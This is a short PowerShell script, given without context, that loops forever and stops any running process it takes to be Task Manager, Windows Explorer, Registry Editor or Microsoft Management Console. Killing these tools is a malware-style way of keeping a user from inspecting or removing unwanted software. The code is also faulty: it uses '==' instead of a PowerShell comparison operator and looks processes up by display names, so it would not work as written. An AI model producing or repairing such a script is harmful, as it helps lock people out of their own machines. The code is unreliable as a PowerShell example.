while($true){
    $runningProcesses = get-process 
    foreach ($process in $runningProcesses) {
    if(($process == (get-process -Name 'Task Manager')) -Or ($process == (get-process -Name 'Windows Explorer')) -Or ($process == (get-process -Name 'Registry Editor')) -Or ($process == (get-process -Name 'Microsoft Management Console'))){
        Stop-Process -InputObject $process
        }
    }
}
